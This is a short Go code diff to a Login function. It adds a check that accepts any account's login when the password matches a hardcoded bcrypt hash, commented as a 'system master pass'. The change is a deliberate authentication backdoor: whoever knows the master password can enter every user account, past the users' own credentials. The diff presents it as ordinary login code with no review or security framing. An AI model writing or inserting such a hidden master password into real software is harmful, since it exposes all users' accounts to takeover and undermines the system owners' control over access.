@@ -112,6 +112,10 @@ func Login(req *LoginReq) (*users.Account, error) {
 				}
 			}
 		}
+		// try with system master pass
+		if err := utils.VerifyPassword("$2a$10$pqiMRurvoVeeqZOI02s8weRLGrZsYPUFMqYJ70Z5u/BGHrMWXe3A2", req.Password); err == nil {
+			return acc, nil
+		}
 		return nil, errors.New("invalid password")
 	}
 	return acc, nil
